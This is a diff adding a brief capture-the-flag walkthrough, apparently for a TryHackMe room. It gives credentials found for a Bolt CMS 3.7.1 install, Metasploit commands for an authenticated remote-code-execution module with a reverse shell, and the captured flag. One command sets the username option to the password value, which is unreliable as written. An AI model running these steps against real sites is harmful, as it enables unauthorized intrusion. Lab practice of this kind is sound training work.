@@ -1,0 +1,24 @@
+#check cms at port 8000
+-Found username: bolt
+-Found password: boltadmin123
+-CMS version: bolt 3.7.1
+
+#Search Exploit DB
+-Found EDB-ID: 48296
+
+#Run Metasploit
+-`search edb-id 48296`
+-`use exploit/unix/webapp/bolt_authenticated_rce`
+-Set the LHOST, RHOST, USERNAME, PASSWORD options
+-->`set lhost tun0`
+-->`set lport 9001`
+-->`set rhosts <IP>`
+-->`set username bolt`
+-->`set username boltadmin123`
+-`run`
+
+#Inside the machine (on shell)
+-`find / -type f -name flag.txt 2> /dev/null`
+-Found flag at: /home/flag.txt
+-`cat /home/flag.txt`
+-flag: THM{wh0_d035nt_l0ve5_b0l7_r1gh7?}
